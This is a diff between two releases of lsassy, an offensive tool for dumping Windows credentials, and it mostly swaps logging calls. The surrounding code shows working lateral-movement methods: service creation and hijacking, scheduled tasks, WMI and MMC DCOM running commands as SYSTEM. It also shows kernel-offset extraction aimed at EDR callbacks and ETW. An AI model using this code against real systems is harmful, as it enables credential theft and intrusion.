+│ │                  return f'{imageVersion},{",".join(known_offsets[imageVersion])}\n'
+│ │ @@ -541,39 +541,39 @@
+│ │                         ('_ETW_GUID_ENTRY* GuidEntry', self.get_field_offset),
+│ │                         ('_TRACE_ENABLE_INFO ProviderEnableInfo', self.get_field_offset)]
+│ │              symbols_values = list()
+│ │              for symbol_name, get_offset in symbols:
+│ │                  symbol_value = get_offset(all_symbols_info, symbol_name)
+│ │                  symbols_values.append(symbol_value)
+│ │              if "R2_CURL" not in os.environ and all(val == 0 for val in symbols_values):
+│ │ -                logging.warning("Radare2 may have trouble to download PDB files. R2_CURL=1 environement variable has been set. Trying again.")
+│ │ +                lsassy_logger.warning("Radare2 may have trouble to download PDB files. R2_CURL=1 environement variable has been set. Trying again.")
+│ │                  os.environ["R2_CURL"] = "1"
+│ │                  self.extractOffsets(input_file)
+│ │  
+│ │              return f'{imageVersion},{",".join(hex(val).replace("0x", "") for val in symbols_values)}\n'
+│ │          except Exception as e:
+│ │              return None
+│ │  
+│ │      def get_offsets(self, ntoskrnl_path):
+│ │          try:
+│ │              output = self.run(["r2", "-v"], capture_output=True).stdout.decode()
+│ │          except Exception as e:
+│ │              if "No such file or directory" in str(e):
+│ │ -                logging.warning("'r2' command is not in path. Automatic offsets extraction is not possible.")
+│ │ +                lsassy_logger.warning("'r2' command is not in path. Automatic offsets extraction is not possible.")
+│ │              else:
+│ │ -                logging.warning("Unexpected error while running Radare2")
+│ │ +                lsassy_logger.warning("Unexpected error while running Radare2")
+│ │              return None
+│ │          ma, me, mi = map(int, output.splitlines()[0].split(" ")[1].split("."))
+│ │          if (ma, me, mi) < (5, 0, 0):
+│ │ -            logging.error("This feature has been tested with radare2 5.0.0 (works) and 4.3.1 (does NOT work)")
+│ │ +            lsassy_logger.error("This feature has been tested with radare2 5.0.0 (works) and 4.3.1 (does NOT work)")
+│ │              return None
+│ │  
+│ │          try:
+│ │              self.run(["cabextract", "-v"], check=True, capture_output=True)
+│ │          except (subprocess.CalledProcessError, FileNotFoundError):
+│ │ -            logging.error("Radare2 needs 'cabextract' package to be installed to work with PDB")
+│ │ +            lsassy_logger.error("Radare2 needs 'cabextract' package to be installed to work with PDB")
+│ │              return None
+│ │          
+│ │          output_content = 'ntoskrnlVersion,PspCreateProcessNotifyRoutineOffset,PspCreateThreadNotifyRoutineOffset,PspLoadImageNotifyRoutineOffset,_PS_PROTECTIONOffset,EtwThreatIntProvRegHandleOffset,EtwRegEntry_GuidEntryOffset,EtwGuidEntry_ProviderEnableInfoOffset\n'
+│ │  
+│ │          ret = self.extractOffsets(ntoskrnl_path)
+│ │          return ret if not ret else output_content + ret
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/mirrordump.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/mirrordump.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/mirrordump_embedded.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/mirrordump_embedded.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/nanodump.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/nanodump.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/nanodump_ssp_embedded.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/nanodump_ssp_embedded.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/ppldump.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/ppldump.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/ppldump_embedded.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/ppldump_embedded.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/procdump.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/procdump.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/procdump_embedded.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/procdump_embedded.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/rawrpc.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/rawrpc.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/rawrpc_embedded.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/rawrpc_embedded.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/rdrleakdiag.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/rdrleakdiag.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/silentprocessexit.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/silentprocessexit.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/sqldumper.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/sqldumper.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/dumpmethod/wer.py
+│ ├── +++ lsassy-3.1.7/lsassy/dumpmethod/wer.py
+│ │┄ Files identical despite different names
+│ │   --- lsassy-3.1.6/lsassy/exec/mmc.py
+│ ├── +++ lsassy-3.1.7/lsassy/exec/mmc.py
+│ │┄ Files 3% similar despite different names
+│ │ @@ -25,25 +25,24 @@
+│ │  #  DCOM
+│ │  #
+│ │  # ToDo:
+│ │  # [ ] Kerberos auth not working, invalid_checksum is thrown. Most probably sequence numbers out of sync due to
+│ │  #     getInterface() method
+│ │  #
+│ │  
+│ │ -import logging
+│ │ -
+│ │  from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, DISPATCH_PROPERTYGET, \
+│ │      VARIANT, VARENUM, DISPATCH_METHOD
+│ │  from impacket.dcerpc.v5.dcomrt import DCOMConnection
+│ │  from impacket.dcerpc.v5.dcomrt import OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, OBJREF_HANDLER, \
+│ │      OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, FLAGS_OBJREF_EXTENDED, \
+│ │      IRemUnknown2, INTERFACE
+│ │  from impacket.dcerpc.v5.dtypes import NULL
+│ │  
+│ │  from lsassy.exec import IExec
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Exec(IExec):
+│ │      """
+│ │      Remote execution using MMC as provided user
+│ │  
+│ │      This execution method does not provide debug privilege
+│ │ @@ -68,15 +67,15 @@
+│ │          elif objRefType == FLAGS_OBJREF_HANDLER:
+│ │              objRef = OBJREF_HANDLER(b''.join(resp))
+│ │          elif objRefType == FLAGS_OBJREF_STANDARD:
+│ │              objRef = OBJREF_STANDARD(b''.join(resp))
+│ │          elif objRefType == FLAGS_OBJREF_EXTENDED:
+│ │              objRef = OBJREF_EXTENDED(b''.join(resp))
+│ │          else:
+│ │ -            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)
+│ │ +            lsassy_logger.error("Unknown OBJREF Type! 0x%x" % objRefType)
+│ │  
+│ │          return IRemUnknown2(
+│ │              INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
+│ │                        oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
+│ │                        target=interface.get_target()))
+│ │  
+│ │      def clean(self):
+│ │ @@ -135,15 +134,15 @@
+│ │  
+│ │              pQuit = iMMC.GetIDsOfNames(('Quit',))[0]
+│ │  
+│ │              self.__quit = (iMMC, pQuit)
+│ │              self.__executeShellCommand = (iActiveView, pExecuteShellCommand)
+│ │  
+│ │          except Exception as e:
+│ │ -            logging.debug("Error : {}".format(e), exc_info=True)
+│ │ +            lsassy_logger.debug("Error : {}".format(e), exc_info=True)
+│ │              self.clean()
+│ │  
+│ │          dispParams = DISPPARAMS(None, False)
+│ │          dispParams['rgdispidNamedArgs'] = NULL
+│ │          dispParams['cArgs'] = 4
+│ │          dispParams['cNamedArgs'] = 0
+│ │          arg0 = VARIANT(None, False)
+│ │   --- lsassy-3.1.6/lsassy/exec/smb.py
+│ ├── +++ lsassy-3.1.7/lsassy/exec/smb.py
+│ │┄ Files 14% similar despite different names
+│ │ @@ -3,21 +3,21 @@
+│ │  # Website:
+│ │  #  https://beta.hackndo.com [FR]
+│ │  #  https://en.hackndo.com [EN]
+│ │  
+│ │  # Based on Impacket smbexec implementation by @agsolino
+│ │  # https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+│ │  
+│ │ -import logging
+│ │  import random
+│ │  import string
+│ │  
+│ │  from impacket.dcerpc.v5 import transport, scmr
+│ │  
+│ │  from lsassy.exec import IExec
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Exec(IExec):
+│ │      """
+│ │      Remote execution using service creation as SYSTEM
+│ │  
+│ │      This execution method provides debug privilege
+│ │ @@ -26,53 +26,53 @@
+│ │  
+│ │      def __init__(self, session):
+│ │          self._scmr = None
+│ │          self._service = None
+│ │          self._rpctransport = None
+│ │          self._serviceName = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
+│ │          super().__init__(session)
+│ │ -        
+│ │ +
+│ │      def clean(self):
+│ │          try:
+│ │              scmr.hRDeleteService(self._scmr, self._service)
+│ │              scmr.hRCloseServiceHandle(self._scmr, self._service)
+│ │ -            logging.debug("Service %s deleted" % self._serviceName)
+│ │ +            lsassy_logger.debug("Service %s deleted" % self._serviceName)
+│ │          except:
+│ │ -            logging.warning("An error occurred while trying to delete service %s. Trying again." % self._serviceName)
+│ │ +            lsassy_logger.warning("An error occurred while trying to delete service %s. Trying again." % self._serviceName)
+│ │              try:
+│ │ -                logging.debug("Trying to connect back to SCMR")
+│ │ +                lsassy_logger.debug("Trying to connect back to SCMR")
+│ │                  self._scmr = self._rpctransport.get_dce_rpc()
+│ │                  try:
+│ │                      self._scmr.connect()
+│ │                  except Exception as e:
+│ │                      raise Exception("An error occurred while connecting to SVCCTL: %s" % e)
+│ │ -                logging.debug("Connected to SCMR")
+│ │ +                lsassy_logger.debug("Connected to SCMR")
+│ │                  self._scmr.bind(scmr.MSRPC_UUID_SCMR)
+│ │                  resp = scmr.hROpenSCManagerW(self._scmr)
+│ │                  _scHandle = resp['lpScHandle']
+│ │                  resp = scmr.hROpenServiceW(self._scmr, _scHandle, self._serviceName)
+│ │ -                logging.debug("Found service %s" % self._serviceName)
+│ │ +                lsassy_logger.debug("Found service %s" % self._serviceName)
+│ │                  self._service = resp['lpServiceHandle']
+│ │                  scmr.hRDeleteService(self._scmr, self._service)
+│ │ -                logging.debug("Service %s deleted" % self._serviceName)
+│ │ +                lsassy_logger.debug("Service %s deleted" % self._serviceName)
+│ │                  scmr.hRControlService(self._scmr, self._service, scmr.SERVICE_CONTROL_STOP)
+│ │                  scmr.hRCloseServiceHandle(self._scmr, self._service)
+│ │              except scmr.DCERPCException:
+│ │ -                logging.debug("A DCERPCException error occured while trying to delete %s" % self._serviceName, exc_info=True)
+│ │ +                lsassy_logger.debug("A DCERPCException error occured while trying to delete %s" % self._serviceName, exc_info=True)
+│ │                  pass
+│ │              except:
+│ │ -                logging.debug("An unknown error occured while trying to delete %s" % self._serviceName, exc_info=True)
+│ │ +                lsassy_logger.debug("An unknown error occured while trying to delete %s" % self._serviceName, exc_info=True)
+│ │                  pass
+│ │  
+│ │      def exec(self, command):
+│ │          if not super().exec(command):
+│ │              return False
+│ │          try:
+│ │              stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % self.session.address
+│ │ -            logging.debug('StringBinding %s' % stringbinding)
+│ │ +            lsassy_logger.debug('StringBinding %s' % stringbinding)
+│ │              self._rpctransport = transport.DCERPCTransportFactory(stringbinding)
+│ │              self._rpctransport.set_dport(445)
+│ │              self._rpctransport.setRemoteHost(self.session.address)
+│ │              if hasattr(self._rpctransport, 'set_credentials'):
+│ │                  # This method exists only for selected protocol sequences.
+│ │                  self._rpctransport.set_credentials(self.session.username, self.session.password, self.session.domain,
+│ │                                                     self.session.lmhash, self.session.nthash, self.session.aesKey)
+│ │ @@ -86,23 +86,23 @@
+│ │              s.setTimeout(100000)
+│ │              self._scmr.bind(scmr.MSRPC_UUID_SCMR)
+│ │              resp = scmr.hROpenSCManagerW(self._scmr)
+│ │              _scHandle = resp['lpScHandle']
+│ │              resp = scmr.hRCreateServiceW(self._scmr, _scHandle, self._serviceName, self._serviceName,
+│ │                                           lpBinaryPathName="%COMSPEC% /Q /c {}".format(command),
+│ │                                           dwStartType=scmr.SERVICE_DEMAND_START)
+│ │ -            logging.debug("Service %s created" % self._serviceName)
+│ │ +            lsassy_logger.debug("Service %s created" % self._serviceName)
+│ │              self._service = resp['lpServiceHandle']
+│ │              try:
+│ │                  scmr.hRStartServiceW(self._scmr, self._service)
+│ │ -                logging.debug("Service %s restarted for command execution" % self._serviceName)
+│ │ +                lsassy_logger.debug("Service %s restarted for command execution" % self._serviceName)
+│ │              except:
+│ │                  pass
+│ │              self.clean()
+│ │          except KeyboardInterrupt as e:
+│ │ -            logging.debug("Keyboard interrupt: Trying to delete %s if it exists" % self._serviceName)
+│ │ +            lsassy_logger.debug("Keyboard interrupt: Trying to delete %s if it exists" % self._serviceName)
+│ │              self.clean()
+│ │              raise KeyboardInterrupt(e)
+│ │          except Exception as e:
+│ │              self.clean()
+│ │              raise Exception(e)
+│ │          return True
+│ │   --- lsassy-3.1.6/lsassy/exec/smb_stealth.py
+│ ├── +++ lsassy-3.1.7/lsassy/exec/smb_stealth.py
+│ │┄ Files 12% similar despite different names
+│ │ @@ -7,20 +7,19 @@
+│ │  # Idea of @Cyb3rSn0rlax https://twitter.com/Cyb3rSn0rlax/status/1435531922135035912
+│ │  
+│ │  # Based on Impacket smbexec implementation by @agsolino
+│ │  # https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+│ │  # And Mr-Un1k0d3r scshell.py script (Thanks @_Laox https://twitter.com/_Laox/status/1435552150868926468)
+│ │  # https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/scshell.py
+│ │  
+│ │ -import logging
+│ │ -
+│ │  from impacket.dcerpc.v5 import transport, scmr
+│ │  from impacket.dcerpc.v5.ndr import NULL
+│ │  
+│ │  from lsassy.exec import IExec
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Exec(IExec):
+│ │      """
+│ │      Remote execution using service modification as SYSTEM
+│ │  
+│ │      This execution method provides debug privilege
+│ │ @@ -52,30 +51,30 @@
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                  )
+│ │ -                logging.debug("Service %s restored" % self._serviceName)
+│ │ +                lsassy_logger.debug("Service %s restored" % self._serviceName)
+│ │          except:
+│ │ -            logging.warning("An error occurred while trying to restore service %s. Trying again." % self._serviceName)
+│ │ +            lsassy_logger.warning("An error occurred while trying to restore service %s. Trying again." % self._serviceName)
+│ │              try:
+│ │ -                logging.debug("Trying to connect back to SCMR")
+│ │ +                lsassy_logger.debug("Trying to connect back to SCMR")
+│ │                  self._scmr = self._rpctransport.get_dce_rpc()
+│ │                  try:
+│ │                      self._scmr.connect()
+│ │                  except Exception as e:
+│ │                      raise Exception("An error occurred while connecting to SVCCTL: %s" % e)
+│ │ -                logging.debug("Connected to SCMR")
+│ │ +                lsassy_logger.debug("Connected to SCMR")
+│ │                  self._scmr.bind(scmr.MSRPC_UUID_SCMR)
+│ │                  resp = scmr.hROpenSCManagerW(self._scmr)
+│ │                  _scHandle = resp['lpScHandle']
+│ │                  resp = scmr.hROpenServiceW(self._scmr, _scHandle, self._serviceName)
+│ │ -                logging.debug("Found service %s" % self._serviceName)
+│ │ +                lsassy_logger.debug("Found service %s" % self._serviceName)
+│ │                  self._service = resp['lpServiceHandle']
+│ │                  scmr.hRChangeServiceConfigW(
+│ │                      self._scmr,
+│ │                      self._service,
+│ │                      scmr.SERVICE_NO_CHANGE,
+│ │                      self._startType,
+│ │                      self._errorControl,
+│ │ @@ -85,31 +84,31 @@
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                  )
+│ │ -                logging.debug("Service %s restored" % self._serviceName)
+│ │ +                lsassy_logger.debug("Service %s restored" % self._serviceName)
+│ │                  scmr.hRControlService(self._scmr, self._service, scmr.SERVICE_CONTROL_STOP)
+│ │                  scmr.hRCloseServiceHandle(self._scmr, self._service)
+│ │              except scmr.DCERPCException:
+│ │ -                logging.debug("A DCERPCException error occured while trying to delete %s" % self._serviceName,
+│ │ +                lsassy_logger.debug("A DCERPCException error occured while trying to delete %s" % self._serviceName,
+│ │                                exc_info=True)
+│ │                  pass
+│ │              except:
+│ │ -                logging.debug("An unknown error occured while trying to delete %s" % self._serviceName, exc_info=True)
+│ │ +                lsassy_logger.debug("An unknown error occured while trying to delete %s" % self._serviceName, exc_info=True)
+│ │                  pass
+│ │  
+│ │      def exec(self, command):
+│ │          if not super().exec(command):
+│ │              return False
+│ │          try:
+│ │              stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % self.session.address
+│ │ -            logging.debug('StringBinding %s' % stringbinding)
+│ │ +            lsassy_logger.debug('StringBinding %s' % stringbinding)
+│ │              self._rpctransport = transport.DCERPCTransportFactory(stringbinding)
+│ │              self._rpctransport.set_dport(445)
+│ │              self._rpctransport.setRemoteHost(self.session.address)
+│ │              if hasattr(self._rpctransport, 'set_credentials'):
+│ │                  # This method exists only for selected protocol sequences.
+│ │                  self._rpctransport.set_credentials(self.session.username, self.session.password, self.session.domain,
+│ │                                                     self.session.lmhash, self.session.nthash, self.session.aesKey)
+│ │ @@ -127,15 +126,15 @@
+│ │  
+│ │              resp = scmr.hROpenServiceW(self._scmr, _scHandle, self._serviceName)
+│ │              self._service = resp['lpServiceHandle']
+│ │              resp = scmr.hRQueryServiceConfigW(self._scmr, self._service)
+│ │              self._binaryPath = resp['lpServiceConfig']['lpBinaryPathName']
+│ │              self._startType = resp['lpServiceConfig']['dwStartType']
+│ │              self._errorControl = resp['lpServiceConfig']['dwErrorControl']
+│ │ -            logging.info('({}) Current service binary path {}'.format(self._serviceName, self._binaryPath))
+│ │ +            lsassy_logger.info('({}) Current service binary path {}'.format(self._serviceName, self._binaryPath))
+│ │  
+│ │              scmr.hRChangeServiceConfigW(
+│ │                  self._scmr,
+│ │                  self._service,
+│ │                  scmr.SERVICE_NO_CHANGE,
+│ │                  scmr.SERVICE_DEMAND_START,
+│ │                  scmr.SERVICE_ERROR_IGNORE,
+│ │ @@ -147,15 +146,15 @@
+│ │                  NULL,
+│ │                  NULL,
+│ │                  NULL,
+│ │                  NULL,
+│ │              )
+│ │              try:
+│ │                  scmr.hRStartServiceW(self._scmr, self._service)
+│ │ -                logging.debug("Service %s restarted for command execution" % self._serviceName)
+│ │ +                lsassy_logger.debug("Service %s restarted for command execution" % self._serviceName)
+│ │              except:
+│ │                  pass
+│ │  
+│ │              try:
+│ │                  scmr.hRChangeServiceConfigW(
+│ │                      self._scmr,
+│ │                      self._service,
+│ │ @@ -168,23 +167,23 @@
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                      NULL,
+│ │                  )
+│ │ -                logging.info('({}) Service binary path has been restored'.format(self._serviceName))
+│ │ +                lsassy_logger.info('({}) Service binary path has been restored'.format(self._serviceName))
+│ │                  self._startType = ""
+│ │                  self._errorControl = ""
+│ │                  self._binaryPath = ""
+│ │              except Exception as e:
+│ │                  self.clean()
+│ │                  raise Exception(e)
+│ │              self.clean()
+│ │          except KeyboardInterrupt as e:
+│ │ -            logging.debug("Keyboard interrupt: Trying to restore %s if it exists" % self._serviceName)
+│ │ +            lsassy_logger.debug("Keyboard interrupt: Trying to restore %s if it exists" % self._serviceName)
+│ │              self.clean()
+│ │              raise KeyboardInterrupt(e)
+│ │          except Exception as e:
+│ │              self.clean()
+│ │              raise Exception(e)
+│ │          return True
+│ │   --- lsassy-3.1.6/lsassy/exec/task.py
+│ ├── +++ lsassy-3.1.7/lsassy/exec/task.py
+│ │┄ Files 4% similar despite different names
+│ │ @@ -3,24 +3,24 @@
+│ │  # Website:
+│ │  #  https://beta.hackndo.com [FR]
+│ │  #  https://en.hackndo.com [EN]
+│ │  
+│ │  # Based on Impacket atexec implementation by @agsolino
+│ │  # https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py
+│ │  
+│ │ -import logging
+│ │  import random
+│ │  import string
+│ │  import time
+│ │  
+│ │  from impacket.dcerpc.v5 import tsch, transport
+│ │  from impacket.dcerpc.v5.dtypes import NULL
+│ │  from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+│ │  
+│ │  from lsassy.exec import IExec
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Exec(IExec):
+│ │      """
+│ │      Remote execution using task creation as SYSTEM
+│ │  
+│ │      This execution method provides debug privilege
+│ │ @@ -48,15 +48,15 @@
+│ │              self._dce.set_credentials(*self._rpctransport.get_credentials())
+│ │              if self.session.kerberos:
+│ │                  self._dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+│ │              self._dce.connect()
+│ │              self._dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+│ │              self._dce.bind(tsch.MSRPC_UUID_TSCHS)
+│ │              xml = self.gen_xml(command)
+│ │ -            logging.debug("Register random task {}".format(self._taskname))
+│ │ +            lsassy_logger.debug("Register random task {}".format(self._taskname))
+│ │              tsch.hSchRpcRegisterTask(self._dce, '\\%s' % self._taskname, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
+│ │              tsch.hSchRpcRun(self._dce, '\\%s' % self._taskname)
+│ │              done = False
+│ │              while not done:
+│ │                  resp = tsch.hSchRpcGetLastRunInfo(self._dce, '\\%s' % self._taskname)
+│ │                  if resp['pLastRuntime']['wYear'] != 0:
+│ │                      done = True
+│ │ @@ -75,15 +75,15 @@
+│ │      
+│ │      def clean(self):
+│ │          resp = tsch.hSchRpcEnumInstances(self._dce, '\\%s' % self._taskname)
+│ │          if len(resp['pGuids']) != 0:
+│ │              tsch.hSchRpcStopInstance(self._dce, resp['pGuids'][0])
+│ │          tsch.hSchRpcDelete(self._dce, '\\%s' % self._taskname)
+│ │          self._dce.disconnect()
+│ │ -        logging.debug("Task %s has been removed" % self._taskname)
+│ │ +        lsassy_logger.debug("Task %s has been removed" % self._taskname)
+│ │              
+│ │      def gen_xml(self, command):
+│ │  
+│ │          return """<?xml version="1.0" encoding="UTF-16"?>
+│ │      <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+│ │        <Triggers>
+│ │          <TimeTrigger>
+│ │   --- lsassy-3.1.6/lsassy/exec/wmi.py
+│ ├── +++ lsassy-3.1.7/lsassy/exec/wmi.py
+│ │┄ Files 4% similar despite different names
+│ │ @@ -3,21 +3,20 @@
+│ │  # Website:
+│ │  #  https://beta.hackndo.com [FR]
+│ │  #  https://en.hackndo.com [EN]
+│ │  
+│ │  # Based on Impacket wmiexec implementation by @agsolino
+│ │  # https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
+│ │  
+│ │ -import logging
+│ │ -
+│ │  from impacket.dcerpc.v5.dcom import wmi
+│ │  from impacket.dcerpc.v5.dcomrt import DCOMConnection
+│ │  from impacket.dcerpc.v5.dtypes import NULL
+│ │  
+│ │  from lsassy.exec import IExec
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class Exec(IExec):
+│ │      """
+│ │      Remote execution using WMI as provided user
+│ │  
+│ │      This execution method does not provide debug privilege
+│ │ @@ -65,19 +64,19 @@
+│ │              return False
+│ │          try:
+│ │              self._getwin32process()
+│ │              self.win32Process.Create(command, "C:\\", None)
+│ │              self.iWbemServices.disconnect()
+│ │              self.dcom.disconnect()
+│ │          except KeyboardInterrupt as e:
+│ │ -            logging.debug("WMI Execution stopped because of keyboard interruption")
+│ │ +            lsassy_logger.debug("WMI Execution stopped because of keyboard interruption")
+│ │              self.clean()
+│ │              raise KeyboardInterrupt(e)
+│ │          except Exception as e:
+│ │ -            logging.debug("Error : {}".format(e), exc_info=True)
+│ │ +            lsassy_logger.debug("Error : {}".format(e), exc_info=True)
+│ │              self.clean()
+│ │              raise Exception(e)
+│ │          return True
+│ │  
+│ │      def clean(self):
+│ │          try:
+│ │              self.iWbemServices.disconnect()
+│ │   --- lsassy-3.1.6/lsassy/impacketfile.py
+│ ├── +++ lsassy-3.1.7/lsassy/impacketfile.py
+│ │┄ Files 7% similar despite different names
+│ │ @@ -1,11 +1,11 @@
+│ │ -import logging
+│ │  import time
+│ │  
+│ │  from impacket.smb3structs import *
+│ │ +from lsassy.logger import lsassy_logger
+│ │  
+│ │  
+│ │  class ImpacketFile:
+│ │      """
+│ │      Remote file representation
+│ │  
+│ │      This class uses impacket method to create a file object with usual read methods so that it looks like a local
+│ │ @@ -40,33 +40,36 @@
+│ │          """
+│ │          Method to access a private attribute
+│ │          :return: session instance
+│ │          """
+│ │          return self._session
+│ │  
+│ │      def _open_share(self):
+│ │ +        
+│ │ +
+│ │          try:
+│ │              self._tid = self._session.smb_session.connectTree(self._share_name)
+│ │          except Exception as e:
+│ │ -            logging.warning("ConnectTree error with '{}'".format(self._share_name), exc_info=True)
+│ │ +            lsassy_logger.warning("ConnectTree error with '{}'".format(self._share_name), exc_info=True)
+│ │              return None
+│ │          return self
+│ │  
+│ │ -    @staticmethod
+│ │ -    def create_file(session, share, path, file, content):
+│ │ +    def create_file(self, session, share, path, file, content):
+│ │ +        
+│ │ +
+│ │          path = path.replace("\\", "/")
+│ │          try:
+│ │              share, fpath = share, path + "/" + file
+│ │          except Exception as e:
+│ │ -            logging.warning("Parsing error with '{}'".format(path), exc_info=True)
+│ │ +            lsassy_logger.warning("Parsing error with '{}'".format(path), exc_info=True)
+│ │              return None
+│ │          try:
+│ │              tid = session.smb_session.connectTree(share)
+│ │          except Exception as e:
+│ │ -            logging.warning("ConnectTree error with '{}'".format(share), exc_info=True)
+│ │ +            lsassy_logger.warning("ConnectTree error with '{}'".format(share), exc_info=True)
+│ │              return None
+│ │  
+│ │          fid = None
+│ │  
+│ │          try:
+│ │              fid = session.smb_session._SMBConnection.create(tid, fpath, FILE_WRITE_DATA, FILE_SHARE_WRITE, FILE_NON_DIRECTORY_FILE, FILE_OVERWRITE_IF, 0)
+│ │              finished = False
+│ │ @@ -76,45 +79,48 @@
+│ │                  data = content[rnd*MAX_FILE_WRITE:(rnd+1)*MAX_FILE_WRITE]
+│ │                  if len(data) == 0:
+│ │                      break
+│ │                  session.smb_session._SMBConnection.write(tid, fid, data, rnd*MAX_FILE_WRITE, len(data))
+│ │                  rnd += 1
+│ │          finally:
+│ │              if fid is not None:
+│ │ -                logging.debug("File {}{} created!".format(share, fpath))
+│ │ +                lsassy_logger.debug("File {}{} created!".format(share, fpath))
+│ │                  session.smb_session._SMBConnection.close(tid, fid)
+│ │                  session.smb_session._SMBConnection.disconnectTree(tid)
+│ │                  return True
+│ │          if tid is not None:
+│ │              session.smb_session._SMBConnection.disconnectTree(tid)
+│ │          return None
+│ │  
+│ │      @staticmethod
+│ │      def delete(session, file_path, timeout=5):
+│ │          t = time.time()
+│ │          while True:
+│ │              try:
+│ │                  session.smb_session.deleteFile("C$", file_path)
+│ │ -                logging.debug("File {}{} deleted".format("C$", file_path))
+│ │ +                lsassy_logger.debug("File {}{} deleted".format("C$", file_path))
+│ │                  return True
+│ │              except BrokenPipeError:
+│ │                  if time.time() - t > timeout:
+│ │ -                    logging.warning("File wasn't removed `{}{}`, connection lost".format("C$", file_path),
+│ │ -                                    exc_info=True)
+│ │ +                    lsassy_logger.warning(
+│ │ +                        "File wasn't removed `{}{}`, connection lost".format("C$", file_path),
+│ │ +                        exc_info=True
+│ │ +                    )
+│ │                      return None
+│ │ -                logging.debug("Trying to reconnect ...")
+│ │ +                lsassy_logger.debug("Trying to reconnect ...")
+│ │                  if session.login():
+│ │ -                    logging.success("Reconnected after unexpected disconnection for proper cleanup")
+│ │ +                    print("Reconnected after unexpected disconnection for proper cleanup")
+│ │              except Exception as e:
+│ │                  if "STATUS_OBJECT_NAME_NOT_FOUND" in str(e) or "STATUS_NO_SUCH_FILE" in str(e):
+│ │ +                    lsassy_logger.debug(f"Object or File not found for deletion: {e}")
+│ │                      return True
+│ │                  if time.time() - t > timeout:
+│ │ -                    logging.warning("File wasn't removed `{}{}`".format("C$", file_path), exc_info=True)
+│ │ +                    lsassy_logger.warning("File wasn't removed `{}{}`".format("C$", file_path), exc_info=True)
+│ │                      return None
+│ │ -                logging.debug("Unable to delete file `{}{}`. Retrying...".format("C$", file_path))
+│ │ +                lsassy_logger.debug("Unable to delete file `{}{}`. Retrying...".format("C$", file_path))
+│ │                  time.sleep(0.5)
+│ │  
+│ │      def open(self, share, path, file, timeout=3):
+│ │          """
+│ │          Open remote file
+│ │          :param share: Share location of the remote file
+│ │          :param path: Path of the remote file on provided share
+│ │ @@ -122,31 +128,31 @@
+│ │          :param timeout: Timeout if file access hangs
+│ │          :return: instance of this class
+│ │          """
+│ │          path = path.replace("\\", "/")
+│ │          try:
+│ │              self._share_name, self._fpath = share, path + "/" + file
+│ │          except Exception as e:
